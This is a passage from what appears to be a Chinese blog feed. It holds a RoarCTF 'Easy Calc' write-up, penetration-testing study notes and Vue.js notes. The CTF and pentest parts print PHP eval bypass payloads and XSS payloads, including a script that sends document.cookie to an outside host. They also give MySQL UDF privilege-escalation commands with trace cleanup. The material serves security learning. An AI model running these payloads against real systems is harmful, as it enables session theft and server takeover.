print(flag.text)</span></span><br><span class="line"><span class="comment"># if &quot;You are in&quot; in flag.text:</span></span><br><span class="line"><span class="comment">#     #dbname += j</span></span><br><span class="line"><span class="comment">#     print(45678)</span></span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>表面上是个计算题。。</p><p>看源码发现有个calc.php</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703182146359.png" alt="image-20200703182146359"></p><p>访问一下，看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有个eval函数！！！但是要绕过前面的限制，num变量中不能包含空格、斜杠等</p><p>而且，测试了一下，当num变量为字符串时，会forbidden。。原网页代码中有句话，有waf。。</p><p>不会了，看了一下网上的WP，知道了一个PHP解析漏洞。</p><h3 id="php解析漏洞"><a href="#php解析漏洞" class="headerlink" title="php解析漏洞"></a>php解析漏洞</h3><ul><li>当PHP将查询字符串（在URL或正文中）转换为内部$_GET[‘’]或$__POST[]关联数组时，在将查询字符串进行解析时，会将某些字符删除或用下划线替代，也就是说，当输入 %20num (%20为空格的URL编码)时，在PHP进行解析时，会自动解析为num</li><li>例子1</li></ul><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703190119747.png" alt="image-20200703190119747"></p><p>参见文章：<a href="https://www.anquanke.com/post/id/181682">https://www.anquanke.com/post/id/181682</a></p><p>现在我们有绕过WAF的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=phpinfo()</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/fdsvdfgrth.png" alt="fdsvdfgrth"></p><p>扫描根目录下的文件，但是/被过滤了，可以用chr(47)绕过，47是/的ascii码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703191256119.png" alt="image-20200703191256119"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/vdfvrtyhg.png" alt="vdfvrtyhg"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;刷的一些题</summary>
    
    
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记</title>
    <link href="http://example.com/2020/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2020/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-29T16:00:00.000Z</published>
    <updated>2021-10-25T05:15:45.014Z</updated>
    
    <content type="html"><![CDATA[<p>笔记。<span id="more"></span></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul><li><p>前期交互</p><ul><li>确定项目机范围</li></ul></li><li><p>信息收集</p><ul><li>收集目标相关的资产信息，包括域名、IP、邮箱、防御等</li></ul></li><li><p>威胁建模</p><ul><li>利用已经收集的信息对目标资产进行分析，获取其可能存在的威胁，并规划攻击路径</li></ul></li><li><p>漏洞分析</p><ul><li>发现目标系统中存在的漏洞</li></ul></li><li><p>漏洞利用</p><ul><li>对已发现的漏洞使用攻击向量进行攻击</li></ul></li><li><p>后渗透</p><ul><li>建立立足点，进行权限维持以及内网渗透，获取指定的渗透目标数据，权限等。清理痕迹</li></ul></li><li><p>报告</p><ul><li>编写渗透测试报告</li></ul></li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集的越多，意味着攻击的范围越广</p><p>常见关键信息</p><ul><li>域名、子域名</li><li>IP及端口</li><li>域名历史解析IP</li><li>应用服务系统、版本</li><li>开源情报</li><li>服务端框架，语言</li><li>IP反向查询域名</li></ul><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p>内置在kali中</p><p>Maltego：<a href="https://www.paterva.com/">https://www.paterva.com</a></p><p>Maltego 教程：<a href="https://www.jianshu.com/p/93ab0265375b">https://www.jianshu.com/p/93ab0265375b</a></p><p>Recon-Ng：<a href="https://bitbucket.org/LaNMaSteR53/recon-ng.git">https://bitbucket.org/LaNMaSteR53/recon-ng.git</a></p><p>Recon-Ng 教程：<a href="https://www.freebuf.com/sectool/141544.html">https://www.freebuf.com/sectool/141544.html</a></p><p>theHarvester：<a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><p>theHarvester 教程：<a href="https://cloud.tencent.com/developer/news/47698">https://cloud.tencent.com/developer/news/47698</a></p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>主要以下四个方面</p><ul><li>传统漏洞</li><li>利用通用漏洞</li><li>弱口令等目标脆弱点</li><li>代码审计</li></ul><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul><li>寻找注入点</li><li>注入方式</li></ul><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>bluecms</p><ul><li>找后台<ul><li>手工：admin、manage</li><li>工具：御剑</li></ul></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200629195512778.png" alt="image-20200629195512778"></p><ul><li>&lt;img/src=x&gt;</li><li><code>&lt;svg/onload=x &gt;</code></li><li><script> alert(1)<script></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src =&quot;http://www.domin.com?log.php?c=&quot; + encodeURI(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>绕过长度限制</p><ul><li><h2 id="引入外部脚本"><a href="#引入外部脚本" class="headerlink" title="引入外部脚本"></a><img src="" alt="img">引入外部脚本</h2></li><li>短链接<ul><li>dwz.cn</li></ul></li></ul><p>步骤</p><ul><li>发现xss利用点</li><li>构造xss paload获取管理员cookie</li><li>利用管理员cookie进行管理页面登录</li><li>登陆后后台查看有无上传文件权限进行webshell上传</li></ul><p>另外可借助一些XSS平台监听放的【钓鱼链接】</p><h3 id="数据库权限"><a href="#数据库权限" class="headerlink" title="数据库权限"></a>数据库权限</h3><p>mysql</p><ul><li>写webshell select into outfile</li><li>UDF提权</li><li>MOF提权</li><li>配置phpmyadmin日志获取webshell<ul><li>general log</li><li>general log file 记录sql查询记录，默认在./data目录下</li></ul></li></ul><p>sqlserver</p><ul><li>存储过程执行命令</li></ul><p>sql写入webshell条件</p><ul><li>当前数据库用户有文件读写权限<ul><li>须配置 secure_file_priv</li><li></li></ul></li><li>知道绝对路径且可写可执行</li><li>单双引号可以正常使用</li></ul><p>获取绝对路径方式</p><ul><li>报错信息</li><li>phpinfo、探针等文件</li><li>常规目录</li></ul><p>练习：blucms admin/nav.php</p><p>若文件夹无可写权限，可通过文件上传寻找可写入路径</p><ul><li>hex编码绕过，这样可不用引号把内容括起来</li></ul><p>练习靶场</p><p><a href="http://47.106.80.112:8235/">http://47.106.80.112:8235/</a></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>目录扫描工具</p><ul><li>御剑</li><li>OWASP dirbrute</li><li>burpsuite</li><li>webpathbrute</li></ul><p>mysql提权</p><ul><li>UDF提权</li><li>MOF提权</li><li>UDF提权</li></ul><p>实战5：udf提权</p><ul><li>Userdefined Function：是用户自定义函数，mysql为用户提供的一个扩展功能的接口，用户可以通过编写代码的方式编译成.so.dll文件，使用自定义函数</li><li>使用条件<ul><li>mysql &gt; 5.1</li><li>.so .dll文件必须放在mysql的plugin目录下</li><li>有create function权限</li></ul></li></ul><p>获取plugin目录：@@plugin_dir</p><p>此种方法Windows下易用</p><p>工具地址：lib_mysqludf_sys：<a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></p><ul><li>先将仓库clone到本地</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mysqludf/lib_mysqludf_sys</span><br></pre></td></tr></table></figure><ul><li>生成exp</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -l /www/mysql/include -Os -shared lib_mysqludf_sys.c -fPIC -o udf.so</span><br></pre></td></tr></table></figure><ul><li>将生成的文件十六进制编码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;/tmp/udf.so&#x27;))</span><br></pre></td></tr></table></figure><ul><li>获取plugin目录</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@plugin_dir</span><br></pre></td></tr></table></figure><ul><li>写入内容</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&#x27;第三步hex的内容&#x27;) into dump file &#x27;plugin_dir/udf.so&#x27;</span><br></pre></td></tr></table></figure><ul><li>进行函数声明与udf.so相关联</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &#x27;udf.so&#x27;</span><br></pre></td></tr></table></figure><ul><li>执行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;pwd&#x27;);</span><br></pre></td></tr></table></figure><ul><li>痕迹销毁</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval</span><br></pre></td></tr></table></figure><h4 id="redis提权"><a href="#redis提权" class="headerlink" title="redis提权"></a>redis提权</h4><ul><li>定时任务</li><li>写入ssh</li></ul><h3 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h3><p>逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，而导致一些逻辑分支不能够正常处理或处理错误。</p><p>一般有以下几种情况</p><ul><li>密码找回</li><li>任意密码修改（没有旧密码认证）</li><li>越权访问</li><li>API调用</li><li>交易支付过程</li><li>……</li></ul><h4 id="权限控制类"><a href="#权限控制类" class="headerlink" title="权限控制类"></a>权限控制类</h4><h5 id="平行越权"><a href="#平行越权" class="headerlink" title="平行越权"></a>平行越权</h5><ul><li>相同权限用户之间的操作权限控制不当</li><li>一个正常的用户a通常只能对自己的信息进行修改，但由于<strong>系统未对信息修改进行一个判断，判断当前操作是否属于对应的用户的操作</strong>，导致用户a可以操作其他人的信息。</li><li>防护：增加访问与操作对象的用户属性，在对目标对象进行访问与操作时，服务端校验会话与对象的用户属性，在校验通过后才能执行读取和操作。</li></ul><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><ul><li>不同权限用户之间权限控制不当，多发生再低权限用户访问高权限用户资源</li><li>例子：在博客论坛中，一个正常的普通用户a，通过burpsuite抓包修改自己的用户ID为管理员的用户ID，使其成功登录了管理员的帐号。</li><li>防护：所有访问采取默认拒绝机制，采取基于角色访问控制，对于各个功能的访问，规定不同角色拥有不同的访问权限，当用户在使用该功能时，系统要校对用户的权限和访问控制机制是否与规定相同，通过校对者才能使用，否则拒绝使用该功能。</li></ul><h5 id="接口控制"><a href="#接口控制" class="headerlink" title="接口控制"></a>接口控制</h5><ul><li>特殊接口没有做访问权限控制</li><li>例子：在博客论坛中，一个正常的普通用户a使用官方提供的API接口构造链接，用户b通过点击该链接后进行发送或转发用户a指定的内容。</li><li>接口类漏洞大多数都是因为接口没有做验证或者其他预防机制，导致被攻击者所利用，比如一些下载链接接口导致未授权下载，登录接口无验证导致撞库等等。</li></ul><h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><ul><li>基础安全架构，完善用户权限体系。要知道哪些数据对于哪些用户，哪些数据不应该由哪些用户操作</li><li>鉴权，服务端对请求的数据和当前用户身份做校验</li><li>不要直接使用对象的实名或关键字</li><li>对于可控参数进行严格的检查与过滤</li></ul><h4 id="密码修改找回类"><a href="#密码修改找回类" class="headerlink" title="密码修改找回类"></a>密码修改找回类</h4><p><a href="https://untitled-0on9w2imekga.runkit.sh/login">https://untitled-0on9w2imekga.runkit.sh/login</a>?</p><p>正常逻辑下，密码重置、密码找回需要以下三个条件</p><ul><li>用户名</li><li>身份证号码</li><li>手机短信验证码</li></ul><p>然而某些验证不严密的，身份证号和手机短信验证码均可绕过，只需要知道用户名就可以重置任意用户密码</p><ul><li>凭证可破解<ul><li>利用点：爆破验证码</li></ul></li></ul><p><a href="https://untitled-tthv7pk5xegg.runkit.sh/index">https://untitled-tthv7pk5xegg.runkit.sh/index</a>?</p><ul><li>凭证可获取</li></ul><p>开发人员将验证信息包含在响应包中</p><ul><li>token可猜解</li><li>前端校验</li></ul><p>在前端进行验证，相当于没有进行任何防范措施，比如登陆状态如果只以登陆状态码进行判断登陆成功标识，那么修改登陆状态码就能进行登录。</p><p>前端包含对验证码的校验flag，可控</p><ul><li>步骤可跳过</li></ul><p>通过跳过某些关键步骤来达到修改别人密码的目的。</p><h4 id="支付逻辑类"><a href="#支付逻辑类" class="headerlink" title="支付逻辑类"></a>支付逻辑类</h4><ul><li>支付过程中可以直接修改数据包中的支付金额</li><li>没有对购买数量进行复数限制</li><li>请求重放：通过多线程同一时间发送大量请求，当数据库未加锁时出错（条件竞争）</li><li>参数干扰：优惠券，同一代金券重复使用，为满足条件使用代金券</li></ul><h2 id="通用漏洞"><a href="#通用漏洞" class="headerlink" title="通用漏洞"></a>通用漏洞</h2><ul><li>定义：企业及互联网中常用的操作系统，系统组件，重要的框架以及应用中的安全漏洞</li><li>PoC：指一段漏洞证明的代码</li></ul><p>CMS识别：云溪</p><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>分类</p><ul><li>云WAF</li><li>CDN WAF</li><li>主机WAF</li></ul><p>绕过思路</p><p>云waf cdn WAF绕过：尝试直接访问主站</p><p>主机WAF：通过内容绕过</p><p>大小写 内联注释 换行符</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;笔记。</summary>
    
    
    
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>vue笔记</title>
    <link href="http://example.com/2020/03/14/vue%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2020/03/14/vue%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-13T16:00:00.000Z</published>
    <updated>2021-10-25T05:13:59.795Z</updated>
    
    <content type="html"><![CDATA[<p>…..</p><span id="more"></span><p>ES6属性</p><ul><li>速写属性</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obg=&#123;</span><br><span class="line">name;  <span class="comment">//以前写法为name = name;</span></span><br><span class="line">age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>箭头函数</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> func = <span class="function">(<span class="params">a,b</span>) =&gt;</span> a + b;</span><br><span class="line"><span class="keyword">var</span> func1 = <span class="function"><span class="params">a</span> =&gt;</span> a + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">func(<span class="number">4</span>,<span class="number">5</span>);  <span class="comment">//9</span></span><br><span class="line">func1(<span class="number">2</span>); <span class="comment">//4</span></span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>通过new Vue({….})创建实例</p><p>配置对象中的内容会提取到实例中：</p><ul><li>data：数据</li><li>props</li><li>template：字符串，配置模板</li><li>methods：方法</li><li>computed：配置计算属性</li></ul><p>计算属性和方法的区别：计算属性使用时，时当作属性使用</p><p>计算属性会进行缓存，如果依赖不变，则会直接使用缓存结果，不会多次进行计算</p><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>让vue实例控制页面中某个区域的过程，称之为挂载</p><p>方式：</p><ol><li>通过el:”css选择器”进行配置，el:”#app”</li><li>通过vue实例，app.$mount(‘css选择器’)进行配置</li></ol><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>被VUE控制的页面片段</p><ol><li><p>作用：</p><ol><li>提高渲染效率，vue会把模板渲染成虚拟DOM 树，然后再生成真实DOM 树</li></ol></li><li><p>书写在哪：</p><ol><li>在挂载元素中直接书写</li><li>在template中书写</li><li>在render配置中用函数创建</li></ol></li><li><p>模板中写什么</p><ol><li><p>静态内容</p></li><li><p>插值：</p></li><li><p>指令</p><ol><li><p>v-bind：绑定属性。innerHTML</p></li><li><p>v-on：绑定事件。简写：@</p></li><li><p>v-if：判断元素是否需要渲染</p></li><li><p>v-show：判断元素是否应该显示</p><blockquote><p>v-if 是动态添加，当值为 false 时，是完全移除该元素，即 dom 树中不存在该元素。</p></blockquote><blockquote><p>v-show 仅是隐藏 / 显示，值为 false 时，该元素依旧存在于 dom 树中。若其原有样式设置了 display: none 则会导致其无法正常显示。</p></blockquote></li><li><p>v-for：循环遍历，就地更新，如果元素的值发生改变，不会移动dom节点进行更新，而是根据绑定的key值进行更新。</p></li><li><p>v-bind:key：用于帮助在重新渲染时元素的比对，通常和v-for配合使用，提高渲染效率</p></li><li><p>v-model：实现双写绑定，自动绑定value属性值，并注册input事件</p></li><li><p>v-once：执行一次性地插值，当数据改变时，插值处的内容不会更新</p></li><li><p>v-html：渲染输出绑定的html代码</p></li></ol></li></ol></li></ol><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><h3 id="ES模块化"><a href="#ES模块化" class="headerlink" title="ES模块化"></a>ES模块化</h3><h4 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具名导出 &#123; double:fn&#125;</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">double</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a*<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//&#123;n : 3&#125;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> n = <span class="number">3</span>;</span><br></pre></td></tr></table></figure><h4 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h4><p>须先在文件中导出才能导入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx <span class="keyword">from</span> <span class="string">&#x27;js文件路径&#x27;</span> <span class="comment">//导入路径文件中的default</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;double&#125;  <span class="keyword">from</span> <span class="string">&#x27;js文件路径&#x27;</span>  <span class="comment">//具名导入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> obj = <span class="keyword">from</span> <span class="string">&#x27;js文件路径&#x27;</span>  <span class="comment">//导入全部</span></span><br></pre></td></tr></table></figure><h3 id="组件概念"><a href="#组件概念" class="headerlink" title="组件概念"></a>组件概念</h3><p>组件化，即把每一个页面中区域功能细分，每一个区域成为一个组件，每个组件包含：</p><ul><li>功能（JS代码）</li><li>内容（模板代码）</li><li>样式（CSS代码）</li></ul><h4 id="创建组件"><a href="#创建组件" class="headerlink" title="创建组件"></a>创建组件</h4><p>组件是根据一个普通的配置对象创建的所以要开发一个组件，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myApp = &#123;</span><br><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span>&#123;</span><br><span class="line">......</span><br><span class="line">&#125;;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">method</span>:&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;.$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>注意，组件中无el元素，用$mount进行挂载</li><li>data属性是函数模式</li></ul><p>注册和使用组件</p><h4 id="全局注册"><a href="#全局注册" class="headerlink" title="全局注册"></a>全局注册</h4><p>在main.js中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(“使用名”,导入名称)</span><br></pre></td></tr></table></figure><h4 id="局部注册"><a href="#局部注册" class="headerlink" title="局部注册"></a>局部注册</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用</span></span><br><span class="line">&lt;componentName/&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在view文件夹中</span></span><br><span class="line"><span class="keyword">import</span>  componentName <span class="keyword">from</span> app.view</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line"><span class="attr">components</span>:&#123;</span><br><span class="line">componentName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>组件命名规范<ul><li>大驼峰命名法（可用短横线方式调用）： =</li><li>短横线命名法</li></ul></li></ul><h4 id="组件树"><a href="#组件树" class="headerlink" title="组件树"></a>组件树</h4><p>组件之间传递数据</p><p>props数组：声明可以接受的数据</p><p>传递数据的组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;user-info v-<span class="keyword">for</span>=<span class="string">&quot;(item,i) in users&quot;</span> :key=<span class="string">&quot;i&quot;</span> :name=<span class="string">&#x27;item.name&#x27;</span> &gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line"><span class="attr">data</span>:&#123;</span><br><span class="line"><span class="attr">users</span>:[</span><br><span class="line">&#123;<span class="attr">name</span>:<span class="number">123</span>&#125;,</span><br><span class="line">&#123;<span class="attr">name</span>:<span class="number">456</span>&#125;</span><br><span class="line">],</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>接收数据的组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">&lt;p&gt;&#123;name&#125;&lt;/name&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line"><span class="attr">props</span>:[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><ul><li>beforeCreate：</li><li>created：app实例被挂载之前，获取数据</li><li>beforeMount：实例挂载之前</li><li>mounted：实例挂载之后</li><li>beforeDestory：销毁前</li><li>destoryed：实例销毁后</li></ul><h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><ul><li><p>格式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>可支持的内容：</p><ul><li>1.用户自定义的数据，需通过v-bind绑定到节点上</li><li>2.js全局变量，如join函数，date函数等</li></ul></li><li><p>js表达式（不能是语句或者流控制句）</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 